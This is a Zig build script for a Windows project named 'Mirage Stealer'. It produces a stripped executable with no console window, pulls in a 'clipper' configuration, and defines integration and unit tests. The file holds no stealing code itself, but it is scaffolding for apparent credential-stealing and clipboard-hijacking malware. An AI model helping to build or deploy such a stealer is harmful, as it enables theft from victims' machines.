const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{
        .default_target = .{ .cpu_arch = .x86_64, .os_tag = .windows, .abi = .msvc },
    });

    // Mirage Stealer
    {
        const e = b.addExecutable(.{
            .name = "Mirage",
            .root_module = b.createModule(.{ .root_source_file = b.path("src/main.zig"), .target = target, .optimize = .ReleaseSmall, .strip = true, .single_threaded = true }),
        });
        e.subsystem = .Windows;
        e.root_module.addAnonymousImport("config", .{ .root_source_file = b.path("src/config/config.zig") });
        e.root_module.addAnonymousImport("clipper_config", .{ .root_source_file = b.path("src/clipper/config.zig") });
        b.installArtifact(e);
    }

    // Integration Test
    {
        const e = b.addExecutable(.{
            .name = "MirageIntegrationTest",
            .root_module = b.createModule(.{ .root_source_file = b.path("src/integration_test.zig"), .target = target, .optimize = .ReleaseSmall, .single_threaded = true }),
        });
        e.subsystem = .Console;
        e.root_module.addAnonymousImport("config", .{ .root_source_file = b.path("src/config/config.zig") });
        b.installArtifact(e);
    }

    // Unit Tests
    const test_step = b.step("test", "Run unit tests");
    {
        const t = b.addTest(.{
            .root_module = b.createModule(.{ .root_source_file = b.path("src/main.zig"), .target = target, .optimize = .Debug, .single_threaded = true }),
        });
        t.root_module.addAnonymousImport("config", .{ .root_source_file = b.path("src/config/config.zig") });
        t.root_module.addAnonymousImport("clipper_config", .{ .root_source_file = b.path("src/clipper/config.zig") });
        test_step.dependOn(&b.addRunArtifact(t).step);
    }
}
